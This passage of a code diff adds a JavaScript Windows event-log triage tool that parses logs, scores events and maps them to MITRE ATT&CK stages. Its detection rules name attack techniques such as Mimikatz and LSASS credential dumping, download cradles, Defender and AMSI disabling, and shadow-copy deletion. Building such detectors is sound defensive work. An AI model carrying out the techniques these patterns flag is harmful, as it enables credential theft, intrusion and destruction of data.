+    { parent:/\blsass\.exe\b/i, child:/.+/i, sev:"critical", label:"Process spawned by LSASS — highly anomalous, possible credential dumping or injection", mitre:["T1003.001","T1055"] },
+  ];
+
+  // ── Suspicious command-line patterns ─────────────────────────────────────
+  const DT_CMDLINE_RULES = [
+    { pattern:/-(?:enc|EncodedCommand)\s+[A-Za-z0-9+/]{20,}/i,    sev:"critical", label:"Base64 encoded PowerShell (-enc)",                    mitre:["T1027","T1059.001"] },
+    { pattern:/DownloadString|DownloadFile|Invoke-WebRequest/i,    sev:"critical", label:"Remote download/execution (download cradle)",         mitre:["T1105","T1059.001"] },
+    { pattern:/Invoke-Expression|IEX\s*\(/i,                       sev:"critical", label:"IEX — dynamic in-memory execution",                   mitre:["T1059.001"] },
+    { pattern:/Set-MpPreference\s+-Disable/i,                      sev:"critical", label:"Defender disabled",                                   mitre:["T1562.001"] },
+    { pattern:/Add-MpPreference\s+-ExclusionPath/i,                sev:"critical", label:"AV exclusion added — hiding malware from Defender",   mitre:["T1562.001"] },
+    { pattern:/AmsiInitFailed|amsi\.dll|amsiScanBuffer/i,          sev:"critical", label:"AMSI bypass attempt",                                 mitre:["T1562.001"] },
+    { pattern:/vssadmin.*delete.*shadows|wbadmin.*delete/i,        sev:"critical", label:"Shadow copy deletion — ransomware indicator",         mitre:["T1490"] },
+    { pattern:/mimikatz|sekurlsa|lsadump|logonpasswords/i,         sev:"critical", label:"Mimikatz credential dump command",                    mitre:["T1003.001"] },
+    { pattern:/procdump.*lsass|comsvcs.*MiniDump.*lsass/i,         sev:"critical", label:"LSASS memory dump",                                   mitre:["T1003.001"] },
+    { pattern:/net\s+user\s+.*\/add|net\s+localgroup.*admin.*\/add/i, sev:"critical", label:"Adds user to admin group — privilege escalation",  mitre:["T1136.001","T1098"] },
+    { pattern:/reg\s+add.*\\Run|New-ItemProperty.*\\Run/i,         sev:"critical", label:"Registry Run key added — persistence",                mitre:["T1547.001"] },
+    { pattern:/schtasks\s+\/create/i,                              sev:"critical", label:"Scheduled task created — persistence mechanism",      mitre:["T1053.005"] },
+    { pattern:/sc\s+create|New-Service/i,                          sev:"high",     label:"Service created — persistence or lateral movement",   mitre:["T1543.003"] },
+    { pattern:/certutil.*(?:-urlcache|-decode|-encode)/i,          sev:"critical", label:"CertUtil LOLBin abuse",                               mitre:["T1105","T1140","T1218.003"] },
+    { pattern:/mshta\s+(?:https?:|vbscript:|javascript:)/i,        sev:"critical", label:"MSHTA executing remote/scripted content",             mitre:["T1218.005"] },
+    { pattern:/regsvr32.*(?:\/s|scrobj|https?:)/i,                 sev:"critical", label:"Regsvr32 LOLBin — COM scriptlet execution",           mitre:["T1218.010"] },
+    { pattern:/rundll32.*(?:javascript:|shell32|comsvcs)/i,        sev:"critical", label:"Rundll32 LOLBin abuse",                               mitre:["T1218.011"] },
+    { pattern:/wmic.*process.*call.*create/i,                      sev:"critical", label:"WMIC process creation LOLBin",                        mitre:["T1047"] },
+    { pattern:/-ExecutionPolicy\s+(?:Bypass|Unrestricted)/i,       sev:"high",     label:"PowerShell execution policy bypassed",                mitre:["T1059.001"] },
+    { pattern:/-WindowStyle\s+Hidden|-w\s+hidden/i,                sev:"high",     label:"Hidden window — process concealment",                 mitre:["T1564.003"] },
+    { pattern:/Invoke-Command.*-ComputerName|Enter-PSSession/i,    sev:"high",     label:"PowerShell remote execution — lateral movement",      mitre:["T1021.006"] },
+    { pattern:/net\s+(?:view|use|share|session|accounts)/i,        sev:"medium",   label:"Network reconnaissance via net commands",             mitre:["T1016","T1135"] },
+    { pattern:/whoami|ipconfig\s*\/all|systeminfo|hostname/i,      sev:"medium",   label:"System/user reconnaissance",                         mitre:["T1033","T1082"] },
+    { pattern:/Get-ADUser|Get-ADComputer|Get-ADGroup/i,            sev:"medium",   label:"Active Directory enumeration",                       mitre:["T1087.002","T1069.002"] },
+    { pattern:/\bpsexec\b|\bpsexesvc\b/i,                          sev:"high",     label:"PsExec — lateral movement tool",                     mitre:["T1021.002","T1570"] },
+    { pattern:/\bnltest\b/i,                                       sev:"medium",   label:"Nltest — domain trust enumeration",                  mitre:["T1482"] },
+    { pattern:/taskkill.*(?:defender|av|antivirus|malware|endpoint)/i, sev:"critical", label:"Security tool terminated",                       mitre:["T1562.001"] },
+    { pattern:/cipher\s+\/w|format\s+.*\/q/i,                     sev:"high",     label:"Disk wiping command — anti-forensics",               mitre:["T1485","T1561"] },
+  ];
+
+  // ── Suspicious path patterns ──────────────────────────────────────────────
+  const DT_SUSPICIOUS_PATHS = [
+    { pattern:/\\temp\\|\/tmp\//i,                      sev:"high",   label:"Execution from Temp directory" },
+    { pattern:/\\appdata\\(?:local|roaming)\\[^\\]+\.exe/i, sev:"high", label:"Execution from AppData" },
+    { pattern:/\\downloads\\.*\.exe/i,                  sev:"high",   label:"Execution from Downloads folder" },
+    { pattern:/\\public\\|\\users\\public\\/i,          sev:"high",   label:"Execution from Public folder" },
+    { pattern:/\\recycle/i,                             sev:"critical",label:"Execution from Recycle Bin" },
+    { pattern:/[a-z]{1,2}:\\[^\\]+\.exe$/i,             sev:"high",   label:"Executable at filesystem root" },
+    { pattern:/\bperfmon\b.*\.dll|system32.*\.{3,5}$/i, sev:"medium", label:"Unusual DLL/file extension in System32" },
+  ];
+
+  // ── Known C2/malware network indicators ──────────────────────────────────
+  const DT_SUSPICIOUS_PORTS = new Set([4444,4445,1234,8888,9999,31337,50050,4447,55555,8443,8080,2222]);
+  const DT_C2_PATTERNS = [
+    /\b(?:185|91|194|45|194)\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/,  // High-risk ASN ranges (Tor exits, bulletproof)
+    /https?:\/\/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/,          // HTTP to raw IP
+    /\.(?:xyz|top|click|gq|cf|tk|pw|cc|su|ru|onion)\b/i,       // High-risk TLDs
+  ];
+
+  // ── Windows EventID reference ─────────────────────────────────────────────
+  const DT_EVENT_IDS = {
+    "4624": { cat:"auth",     label:"Logon success",              sev:"info",   icon:"🔓" },
+    "4625": { cat:"auth",     label:"Logon failure",              sev:"medium", icon:"🔐" },
+    "4634": { cat:"auth",     label:"Logoff",                     sev:"info",   icon:"🚪" },
+    "4648": { cat:"auth",     label:"Logon with explicit creds",  sev:"medium", icon:"🔑" },
+    "4672": { cat:"auth",     label:"Special privileges assigned",sev:"medium", icon:"👑" },
+    "4688": { cat:"process",  label:"Process created",            sev:"info",   icon:"⚙️" },
+    "4689": { cat:"process",  label:"Process terminated",         sev:"info",   icon:"⛔" },
+    "4697": { cat:"system",   label:"Service installed",          sev:"high",   icon:"🔩" },
+    "4698": { cat:"system",   label:"Scheduled task created",     sev:"high",   icon:"📌" },
+    "4699": { cat:"system",   label:"Scheduled task deleted",     sev:"medium", icon:"🗑" },
+    "4702": { cat:"system",   label:"Scheduled task updated",     sev:"medium", icon:"🔄" },
+    "4703": { cat:"system",   label:"Token privilege adjusted",   sev:"medium", icon:"🎟" },
+    "4720": { cat:"auth",     label:"User account created",       sev:"high",   icon:"👤" },
+    "4728": { cat:"auth",     label:"Member added to security group",sev:"high",icon:"➕" },
+    "4732": { cat:"auth",     label:"Member added to local admin",sev:"critical",icon:"🚨" },
+    "4740": { cat:"auth",     label:"Account locked out",         sev:"medium", icon:"🔒" },
+    "4756": { cat:"auth",     label:"Member added to universal group",sev:"high",icon:"➕" },
+    "4768": { cat:"auth",     label:"Kerberos TGT requested",     sev:"info",   icon:"🎫" },
+    "4769": { cat:"auth",     label:"Kerberos service ticket",    sev:"info",   icon:"🎫" },
+    "4771": { cat:"auth",     label:"Kerberos pre-auth failed",   sev:"medium", icon:"❌" },
+    "4776": { cat:"auth",     label:"NTLM auth attempt",          sev:"info",   icon:"🔄" },
+    "4798": { cat:"auth",     label:"User local group queried",   sev:"medium", icon:"👥" },
+    "4799": { cat:"auth",     label:"Security-enabled group queried",sev:"medium",icon:"👥" },
+    "7045": { cat:"system",   label:"New service installed",      sev:"high",   icon:"🔩" },
+    "1102": { cat:"system",   label:"Audit log cleared",          sev:"critical",icon:"🚨" },
+    "4616": { cat:"system",   label:"System time changed",        sev:"medium", icon:"⏰" },
+    "4657": { cat:"registry", label:"Registry value modified",    sev:"medium", icon:"🗝" },
+    "4660": { cat:"file",     label:"Object deleted",             sev:"medium", icon:"🗑" },
+    "4663": { cat:"file",     label:"Object access attempt",      sev:"info",   icon:"📄" },
+    "4670": { cat:"file",     label:"Permissions changed",        sev:"medium", icon:"🔒" },
+    "5140": { cat:"network",  label:"Network share accessed",     sev:"medium", icon:"📂" },
+    "5145": { cat:"network",  label:"Network share check",        sev:"info",   icon:"📁" },
+    "5156": { cat:"network",  label:"Network connection allowed", sev:"info",   icon:"🌐" },
+    "5158": { cat:"network",  label:"Network bind allowed",       sev:"info",   icon:"🌐" },
+  };
+
+  // ── Sysmon EventID reference ──────────────────────────────────────────────
+  const DT_SYSMON_IDS = {
+    "1":  { cat:"process",  label:"Process Create",              sev:"info",   icon:"⚙️" },
+    "2":  { cat:"file",     label:"File creation time changed",  sev:"medium", icon:"⏱" },
+    "3":  { cat:"network",  label:"Network connection",          sev:"info",   icon:"🌐" },
+    "5":  { cat:"process",  label:"Process terminated",          sev:"info",   icon:"⛔" },
+    "6":  { cat:"system",   label:"Driver loaded",               sev:"high",   icon:"🔩" },
+    "7":  { cat:"system",   label:"Image/DLL loaded",            sev:"medium", icon:"📦" },
+    "8":  { cat:"process",  label:"CreateRemoteThread",          sev:"critical",icon:"💉" },
+    "9":  { cat:"file",     label:"RawAccessRead",               sev:"high",   icon:"💾" },
+    "10": { cat:"process",  label:"ProcessAccess",               sev:"high",   icon:"🔍" },
+    "11": { cat:"file",     label:"FileCreate",                  sev:"medium", icon:"📄" },
+    "12": { cat:"registry", label:"RegistryCreate/Delete",       sev:"medium", icon:"🗝" },
+    "13": { cat:"registry", label:"RegistryValue set",           sev:"medium", icon:"🗝" },
+    "14": { cat:"registry", label:"RegistryKey renamed",         sev:"medium", icon:"🗝" },
+    "15": { cat:"file",     label:"FileCreateStreamHash",        sev:"medium", icon:"📄" },
+    "17": { cat:"system",   label:"Pipe created",                sev:"medium", icon:"🔗" },
+    "18": { cat:"system",   label:"Pipe connected",              sev:"medium", icon:"🔗" },
+    "22": { cat:"network",  label:"DNS query",                   sev:"info",   icon:"🌐" },
+    "23": { cat:"file",     label:"FileDelete",                  sev:"medium", icon:"🗑" },
+    "25": { cat:"process",  label:"ProcessTampering",            sev:"critical",icon:"💉" },
+  };
+
+  // ── Timestamp parser — handles many formats ───────────────────────────────
+  function dtParseTimestamp(raw) {
+    if (!raw) return null;
+    const s = raw.trim();
+    const attempts = [
+      s,
+      s.replace("T"," ").replace(/Z$/,""),
+      s.replace(/(\d{4})(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})/,"$1-$2-$3 $4:$5:$6"),
+      s.replace(/(\d{1,2})\/(\d{1,2})\/(\d{4})/,"$3-$1-$2"),
+    ];
+    for (const a of attempts) {
+      const d = new Date(a);
+      if (!isNaN(d.getTime())) return d;
+    }
+    return null;
+  }
+
+  // ── Format detection ──────────────────────────────────────────────────────
+  function dtDetectFormat(text) {
+    const t = text.slice(0, 2000).toLowerCase();
+    if (/<event\b|<eventid>|<system>|<provider name=/i.test(text))  return "evtx";
+    if (/eventid[=:,\s]+\d{3,4}/i.test(text))                       return "evtx";
+    if (/^\s*[\[{]/m.test(text) && (text.includes('"EventID"') || text.includes('"timestamp"') || text.includes('"process_name"'))) return "json";
+    if (/^[^\n,]+,[^\n,]+,[^\n,]+/m.test(text) && text.split("\n")[0].split(",").length > 3) return "csv";
+    if (/\b(?:jan|feb|mar|apr|may|jun|jul|aug|sep|oct|nov|dec)\s+\d/i.test(t)) return "syslog";
+    return "raw";
+  }
+
+  // ── Parse CSV ─────────────────────────────────────────────────────────────
+  function dtParseCSV(text) {
+    const lines = text.trim().split("\n");
+    if (lines.length < 2) return [];
+    const headers = lines[0].split(",").map(h => h.trim().toLowerCase().replace(/["\s]/g,""));
+    const fieldMap = {
+      timestamp: ["timestamp","time","datetime","date","timecreated","@timestamp","eventtime"],
+      eventid:   ["eventid","event_id","eventcode","id","event.code","winlog.event_id"],
+      process:   ["process","processname","imagename","image","process_name","newprocessname","commandline_process"],
+      cmdline:   ["cmdline","commandline","command_line","commandlineargs","processcommandline"],
+      user:      ["user","username","subjectusername","targetusername","account_name","user.name","winlog.user.name"],
+      host:      ["host","hostname","computername","computer","source_host","host.name"],
+      parent:    ["parentprocess","parentprocessname","parentimage","parentcommandline","parent_process"],
+      path:      ["path","filepath","fullpath","imagepath","process_path"],
+      pid:       ["pid","processid","newprocessid","process_id"],
+      ppid:      ["ppid","parentprocessid","parent_process_id"],
+      ip:        ["destinationip","destip","dst_ip","remote_address","ipaddress","ip"],
+      port:      ["destinationport","destport","dst_port","port","remote_port"],
+      category:  ["category","eventtype","type","channel","log_source"],
+      severity:  ["severity","level","criticality"],
+    };
+    const colMap = {};
+    Object.entries(fieldMap).forEach(([key, aliases]) => {
+      const idx = headers.findIndex(h => aliases.some(a => h.includes(a)));
+      if (idx >= 0) colMap[key] = idx;
+    });
+    const events = [];
+    for (let i = 1; i < lines.length; i++) {
+      if (!lines[i].trim()) continue;
+      const cols = dtSplitCSVLine(lines[i]);
+      const get  = (key) => colMap[key] !== undefined ? (cols[colMap[key]]||"").trim().replace(/^"|"$/g,"") : "";
+      events.push({
+        rawLine: lines[i],
+        timestamp: get("timestamp"), eventId: get("eventid"),
+        process: get("process"),     cmdline: get("cmdline"),
+        user:    get("user"),        host:    get("host"),
+        parent:  get("parent"),      path:    get("path"),
+        pid:     get("pid"),         ppid:    get("ppid"),
+        ip:      get("ip"),          port:    get("port"),
+        category:get("category"),    severity:get("severity"),
+      });
+    }
+    return events;
+  }
+
+  function dtSplitCSVLine(line) {
+    const result = []; let cur = ""; let inQ = false;
+    for (let i = 0; i < line.length; i++) {
+      if (line[i] === '"') { inQ = !inQ; continue; }
+      if (line[i] === ',' && !inQ) { result.push(cur); cur = ""; continue; }
+      cur += line[i];
+    }
+    result.push(cur);
+    return result;
+  }
+
+  // ── Parse raw/event log text ──────────────────────────────────────────────
+  function dtParseRaw(text) {
+    const lines = text.split("\n");
+    const events = [];
+    for (const line of lines) {
+      if (!line.trim()) continue;
+      // Extract fields with flexible regex
+      const tsMatch  = line.match(/(\d{4}[-\/]\d{2}[-\/]\d{2}[T\s]\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:?\d{2})?)/);
+      const eidMatch = line.match(/[Ee]vent(?:ID)?[=:\s#]+(\d{3,5})/);
+      const procMatch= line.match(/(?:Process(?:Name)?|Image|NewProcessName)[=:\s"]+([^\s,"]+\.exe)/i) ||
+                       line.match(/\b([a-zA-Z0-9_\-]+\.exe)\b/i);
+      const cmdMatch = line.match(/(?:CommandLine|Cmdline|cmd)[=:\s"]+([^\n]{0,300})/i);
+      const userMatch= line.match(/(?:User(?:Name)?|Account)[=:\s"]+([^\s,"]{3,60})/i);
+      const hostMatch= line.match(/(?:Computer(?:Name)?|Host(?:name)?|Machine)[=:\s"]+([^\s,"]{3,60})/i);
+      const ipMatch  = line.match(/(?:Dest(?:ination)?IP|RemoteAddr|IpAddress)[=:\s"]+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/i) ||
+                       line.match(/\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b/);
+      const portMatch= line.match(/(?:Dest(?:ination)?Port|Port)[=:\s"]+(\d{2,5})/i);
+      const parentMatch = line.match(/(?:Parent(?:Process(?:Name)?|Image))[=:\s"]+([^\s,"]+\.exe)/i);
+      const pathMatch= line.match(/(?:Image|ProcessPath|FilePath)[=:\s"]+([A-Za-z]:\\[^\s,"]{5,200})/i);
+      events.push({
+        rawLine: line,
+        timestamp: tsMatch?.[1] || "",
+        eventId:   eidMatch?.[1] || "",
+        process:   (procMatch?.[1] || "").toLowerCase(),
+        cmdline:   cmdMatch?.[1] || "",
+        user:      userMatch?.[1] || "",
+        host:      hostMatch?.[1] || "",
+        parent:    (parentMatch?.[1] || "").toLowerCase(),
+        path:      pathMatch?.[1] || "",
+        ip:        ipMatch?.[1] || "",
+        port:      portMatch?.[1] || "",
+        category:  "",
+        severity:  "",
+      });
+    }
+    return events.filter(e => e.timestamp || e.eventId || e.process || e.cmdline);
+  }
+
+  // ── Parse JSON ────────────────────────────────────────────────────────────
+  function dtParseJSON(text) {
+    try {
+      let data = JSON.parse(text);
+      if (!Array.isArray(data)) data = [data];
+      return data.map(row => {
+        const get = (...keys) => { for (const k of keys) { if (row[k]) return String(row[k]); const parts=k.split("."); let v=row; for(const p of parts) v=v?.[p]; if(v) return String(v); } return ""; };
+        return {
+          rawLine:   JSON.stringify(row).slice(0,200),
+          timestamp: get("timestamp","time","@timestamp","TimeCreated","EventTime","date"),
+          eventId:   get("EventID","event_id","eventcode","event.code","winlog.event_id"),
+          process:   get("ProcessName","process_name","Image","NewProcessName","process.name","image"),
+          cmdline:   get("CommandLine","command_line","cmdline","ProcessCommandLine"),
+          user:      get("User","username","SubjectUserName","user.name","winlog.user.name"),
+          host:      get("Hostname","ComputerName","hostname","host.name","Computer"),
+          parent:    get("ParentProcessName","parent_process","ParentImage","ParentProcessId"),
+          path:      get("ImagePath","process_path","FilePath","full_path"),
+          ip:        get("DestinationIp","dst_ip","remote_address","IpAddress","destination.ip"),
+          port:      get("DestinationPort","dst_port","remote_port","destination.port"),
+          category:  get("Category","EventType","Channel","type"),
+          severity:  get("Severity","Level","severity","level"),
+        };
+      });
+    } catch { return dtParseRaw(text); }
+  }
+
+  // ── Analyze a single event for maliciousness ──────────────────────────────
+  function dtAnalyzeEvent(ev) {
+    const findings = [];
+    const mitreTags = new Set();
+    let maxSev = "benign";
+    const sevOrder = { critical:4, high:3, medium:2, low:1, benign:0 };
+    const addFinding = (sev, label, mitre=[]) => {
+      findings.push({ sev, label });
+      mitre.forEach(t => mitreTags.add(t));
+      if (sevOrder[sev] > sevOrder[maxSev]) maxSev = sev;
+    };
+
+    const procName = (ev.process||"").toLowerCase().replace(/.*[\\\/]/,"");
+    const parentName = (ev.parent||"").toLowerCase().replace(/.*[\\\/]/,"");
+    const cmdline = (ev.cmdline||"").toLowerCase();
+    const path = (ev.path||"").toLowerCase();
+
+    // 1. Known malicious process name
+    if (DT_PROCESS_DB.malicious.has(procName)) {
+      addFinding("critical", `Known malicious tool: ${procName}`, ["T1588"]);
+    }
+    // 2. LOLBin in use
+    if (DT_PROCESS_DB.lolbins.has(procName) && (cmdline || ev.eventId === "4688")) {
+      const isLegitUse = !cmdline || (!/(urlcache|decode|http|script|javascript|vbscript|bypass)/i.test(cmdline));
+      if (!isLegitUse) addFinding("high", `LOLBin abuse: ${procName}`, ["T1218"]);
+    }
+    // 3. Wrong path for system process
+    if (path && DT_PROCESS_DB.expectedPaths[procName]) {
+      const expected = DT_PROCESS_DB.expectedPaths[procName];
+      const isCorrect = expected.some(p => path.startsWith(p));
+      if (!isCorrect) addFinding("critical", `${procName} running from unexpected path: ${ev.path}`, ["T1036.005"]);
+    }
+    // 4. Suspicious path
+    for (const rule of DT_SUSPICIOUS_PATHS) {
+      if (path && rule.pattern.test(path) && !DT_PROCESS_DB.legitimate.has(procName)) {
+        addFinding(rule.sev, rule.label, []);
+      }
+    }
+    // 5. Command line patterns
+    for (const rule of DT_CMDLINE_RULES) {
+      if (cmdline && rule.pattern.test(cmdline)) {
+        addFinding(rule.sev, rule.label, rule.mitre);
+        break; // First match is most relevant
+      }
+    }
+    // More cmdline checks (don't break after first for multi-signal)
+    for (const rule of DT_CMDLINE_RULES.slice(1)) {
+      if (cmdline && rule.pattern.test(ev.cmdline||"")) {
+        if (!findings.some(f => f.label === rule.label)) {
+          addFinding(rule.sev, rule.label, rule.mitre);
+        }
+      }
+    }
+    // 6. Parent-child relationship rules
+    for (const rule of DT_PARENT_CHILD_RULES) {
+      if (rule.parent.test(parentName) && rule.child.test(procName)) {
+        if (!rule.cmdPattern || rule.cmdPattern.test(cmdline)) {
+          addFinding(rule.sev, rule.label, rule.mitre);
+        }
+      }
+    }
+    // 7. Network: suspicious port or C2 pattern
+    if (ev.port && DT_SUSPICIOUS_PORTS.has(parseInt(ev.port))) {
+      addFinding("high", `Connection to C2 port ${ev.port}`, ["T1071","T1090"]);
+    }
+    if (ev.ip) {
+      for (const p of DT_C2_PATTERNS) {
+        if (p.test(ev.ip)) { addFinding("medium", `Suspicious network destination: ${ev.ip}`, ["T1071.001"]); break; }
+      }
+    }
+    // 8. High-severity EventIDs
+    const eid = ev.eventId;
+    if (eid) {
+      const info = DT_EVENT_IDS[eid] || DT_SYSMON_IDS[eid];
+      if (info && (info.sev === "critical" || info.sev === "high")) {
+        addFinding(info.sev, `${info.label} (Event ${eid})`, []);
+      }
+    }
+
+    // Determine verdict
+    let verdict, verdictIcon, verdictColor;
+    if (maxSev === "critical" || findings.filter(f=>f.sev==="critical").length > 0) {
+      verdict = "MALICIOUS"; verdictIcon = "🚨"; verdictColor = "#ef4444";
+    } else if (maxSev === "high" || findings.filter(f=>f.sev==="high").length > 0) {
+      verdict = "SUSPICIOUS"; verdictIcon = "⚠️"; verdictColor = "#fbbf24";
+    } else if (findings.filter(f=>f.sev==="medium").length > 0) {
+      verdict = "SUSPICIOUS"; verdictIcon = "⚠️"; verdictColor = "#f59e0b";
+    } else if (findings.length > 0) {
+      verdict = "REVIEW"; verdictIcon = "🔵"; verdictColor = "#38bdf8";
+    } else if (DT_PROCESS_DB.legitimate.has(procName)) {
+      verdict = "BENIGN"; verdictIcon = "✅"; verdictColor = "#34d399";
+    } else {
+      verdict = "UNKNOWN"; verdictIcon = "⚪"; verdictColor = "#6b7280";
+    }
+
+    return { findings, mitre: [...mitreTags], verdict, verdictIcon, verdictColor, maxSev };
+  }
+
+  // ── Determine event category ──────────────────────────────────────────────
+  function dtGetCategory(ev, analysis) {
+    if (ev.eventId) {
+      const info = DT_EVENT_IDS[ev.eventId] || DT_SYSMON_IDS[ev.eventId];
+      if (info) return info.cat;
+    }
+    const cmd = (ev.cmdline||"").toLowerCase();
+    const proc = (ev.process||"").toLowerCase();
+    if (ev.ip || ev.port || /network|connect|listen|dns/i.test(ev.category)) return "network";
+    if (/reg\b|registry|regedit/i.test(proc+cmd)) return "registry";
+    if (/copy|move|del\b|create.*file|write.*file/i.test(cmd)) return "file";
+    if (/logon|login|auth|kerberos|ntlm/i.test(ev.category||"")) return "auth";
+    if (ev.process) return "process";
+    return "system";
+  }
+
+  // ── Detect attack chain across all events ────────────────────────────────
+  function dtDetectAttackChain(events) {
+    const stages = {
+      recon:     { label:"Reconnaissance",       icon:"🔍", color:"#38bdf8", found:false },
+      initial:   { label:"Initial Access",        icon:"🎯", color:"#f59e0b", found:false },
+      exec:      { label:"Execution",             icon:"⚙️", color:"#fb923c", found:false },
+      persist:   { label:"Persistence",           icon:"📌", color:"#a78bfa", found:false },
+      escalate:  { label:"Privilege Escalation",  icon:"👑", color:"#f87171", found:false },
+      evade:     { label:"Defense Evasion",        icon:"🛡", color:"#fbbf24", found:false },
+      cred:      { label:"Credential Access",      icon:"🔑", color:"#ef4444", found:false },
+      lateral:   { label:"Lateral Movement",       icon:"🔀", color:"#f87171", found:false },
+      collect:   { label:"Collection",             icon:"📂", color:"#fb923c", found:false },
+      c2:        { label:"C2 Communication",       icon:"📡", color:"#ef4444", found:false },
+      exfil:     { label:"Exfiltration",           icon:"📤", color:"#ef4444", found:false },
+      impact:    { label:"Impact",                 icon:"💀", color:"#ef4444", found:false },
+    };
+    for (const ev of events) {
+      const all = [...ev._analysis.findings.map(f=>f.label), ev.cmdline||"", ev.process||""].join(" ").toLowerCase();
+      const mitre = ev._analysis.mitre.join(",");
+      if (/whoami|ipconfig|net view|systeminfo|nltest|get-ad/i.test(all)) stages.recon.found = true;
+      if (/phishing|macro|exploit|download.*exe|dropper/i.test(all)) stages.initial.found = true;
+      if (/powershell|cmd|wscript|mshta|rundll32|iex|invoke-expression/i.test(all)) stages.exec.found = true;
+      if (/scheduled task|registry run|service.*creat|startup/i.test(all)) stages.persist.found = true;
+      if (/privilege|uac bypass|token|add.*admin/i.test(all)) stages.escalate.found = true;
+      if (/amsi|defender.*disab|exclusion|av.*kill|taskkill.*defender/i.test(all)) stages.evade.found = true;
+      if (/lsass|mimikatz|credential|sekurlsa|sam\b|ntlm/i.test(all)) stages.cred.found = true;
+      if (/psexec|lateral|remote.*session|invoke-command|wmic.*node/i.test(all)) stages.lateral.found = true;
+      if (/compress|archive|collect|shadow.*copy|database/i.test(all)) stages.collect.found = true;
+      if (ev.ip || ev.port || /c2.*port|beacon|reverse.*shell/i.test(all)) stages.c2.found = true;
+      if (/exfil|upload.*http|post.*data|ftp.*put/i.test(all)) stages.exfil.found = true;
+      if (/encrypt|ransom|wipe|delete.*shadow|vssadmin/i.test(all)) stages.impact.found = true;
+    }
+    return stages;
+  }
+
+  // ── Main render function ──────────────────────────────────────────────────
+  function dtRender(eventsRaw, format) {
+    const dtTimeline = $("dt-timeline");
+    const dtResults  = $("dt-results");
+    const dtSummary  = $("dt-summary-bar");
+    const dtChain    = $("dt-attack-chain");
+    if (!dtTimeline) return;
+
+    // Parse based on format
+    let events = [];
+    if (format === "csv")     events = dtParseCSV(eventsRaw);
+    else if (format === "json") events = dtParseJSON(eventsRaw);
+    else if (format === "evtx" || format === "raw" || format === "syslog") events = dtParseRaw(eventsRaw);
+    else { // auto
+      const detected = dtDetectFormat(eventsRaw);
+      if (detected === "csv")  events = dtParseCSV(eventsRaw);
+      else if (detected === "json") events = dtParseJSON(eventsRaw);
+      else events = dtParseRaw(eventsRaw);
+    }
+
+    if (!events.length) {
+      $("dt-status").textContent = "No parseable events found. Check format or try a different mode.";
+      return;
+    }
+
+    // Sort by timestamp
+    events.forEach(ev => { ev._ts = dtParseTimestamp(ev.timestamp); });
+    events.sort((a,b) => { if (!a._ts && !b._ts) return 0; if (!a._ts) return 1; if (!b._ts) return -1; return a._ts - b._ts; });
+
+    // Analyze each event
+    events.forEach(ev => {
+      ev._analysis = dtAnalyzeEvent(ev);
+      ev._category = dtGetCategory(ev, ev._analysis);
+      const eid = ev.eventId;
+      if (eid) { ev._eidInfo = DT_EVENT_IDS[eid] || DT_SYSMON_IDS[eid]; }
+    });
+
+    // Stats
+    const malCount  = events.filter(e => e._analysis.verdict === "MALICIOUS").length;
+    const suspCount = events.filter(e => e._analysis.verdict === "SUSPICIOUS").length;
+    const total     = events.length;
+
+    dtResults.style.display = "block";
+    $("dt-status").textContent = `Analyzed ${total} events — ${malCount} malicious, ${suspCount} suspicious`;
+
+    // Summary bar
+    dtSummary.innerHTML = [
+      { num: total,     label:"Total Events",  color:"#38bdf8" },
+      { num: malCount,  label:"🚨 Malicious",   color:"#ef4444" },
+      { num: suspCount, label:"⚠️ Suspicious",  color:"#fbbf24" },
+      { num: events.filter(e=>e._analysis.verdict==="BENIGN").length,  label:"✅ Benign",   color:"#34d399" },
+      { num: events.filter(e=>e._category==="process").length, label:"Processes",  color:"#94a3b8" },
+      { num: events.filter(e=>e._category==="network").length, label:"Network",    color:"#94a3b8" },
+      { num: events.filter(e=>e._category==="auth").length,    label:"Auth",       color:"#94a3b8" },
+    ].map(s => `<div class="dt-stat"><div class="dt-stat-num" style="color:${s.color}">${s.num}</div><div class="dt-stat-label">${s.label}</div></div>`).join("");
+
+    // Attack chain
+    const chain = dtDetectAttackChain(events);
+    const foundStages = Object.values(chain).filter(s => s.found);
+    if (foundStages.length >= 2) {
+      dtChain.style.display = "block";
+      dtChain.innerHTML = `<div class="dt-chain-card">
+        <div class="dt-chain-head">🔗 Attack Chain Detected — ${foundStages.length} stage${foundStages.length>1?"s":""} identified across timeline</div>
+        <div class="dt-chain-stages">${foundStages.map(s=>`
+          <div class="dt-stage-pill" style="background:${s.color}12;color:${s.color};border-color:${s.color}33;">
+            <span>${s.icon}</span><span>${esc(s.label)}</span>
+          </div>`).join("")}</div>
+      </div>`;
+    } else {
+      dtChain.style.display = "none";
+    }
+
+    // Build event cards
+    dtTimeline.innerHTML = events.map((ev, idx) => {
+      const a = ev._analysis;
+      const catCls = `dt-cat-${ev._category}`;
+      const catLabel = { process:"⚙️ Process", network:"🌐 Network", auth:"🔐 Auth",
+                         file:"📁 File", registry:"🗝 Registry", system:"🖥 System", lateral:"🔀 Lateral" }[ev._category] || ev._category;
+      const eidLabel = ev._eidInfo ? ` — ${ev._eidInfo.label}` : "";
+      const filterTags = [
+        ev._category,
+        a.verdict === "MALICIOUS" ? "malicious" : "",
+        (a.verdict === "SUSPICIOUS" || a.verdict === "REVIEW") ? "suspicious" : "",
+      ].filter(Boolean).join(" ");
+
+      const procDisplay = ev.process ? ev.process.replace(/.*[\\\/]/,"") : (ev._eidInfo?.icon||"")+" event";
+      const cmdDisplay  = ev.cmdline ? ev.cmdline.slice(0,200) + (ev.cmdline.length > 200 ? "…" : "") : "";
+      const findingHtml = a.findings.slice(0,3).map(f => {
+        const cls = f.sev === "critical" ? "dt-finding-malicious" :
+                    f.sev === "high"     ? "dt-finding-malicious" : "dt-finding-suspicious";
+        const icon = f.sev === "critical" ? "🚨" : f.sev === "high" ? "⚠️" : "🔵";
+        return `<div class="dt-event-finding ${cls}">${icon} ${esc(f.label)}</div>`;
+      }).join("");
+      const mitreHtml = a.mitre.slice(0,4).map(t =>
+        `<a href="https://attack.mitre.org/techniques/${t.replace(".","/")}" target="_blank" class="dt-mitre-tag">${esc(t)}</a>`
+      ).join("");
+
+      const verdictCls = a.verdict === "MALICIOUS" ? "dt-malicious" :
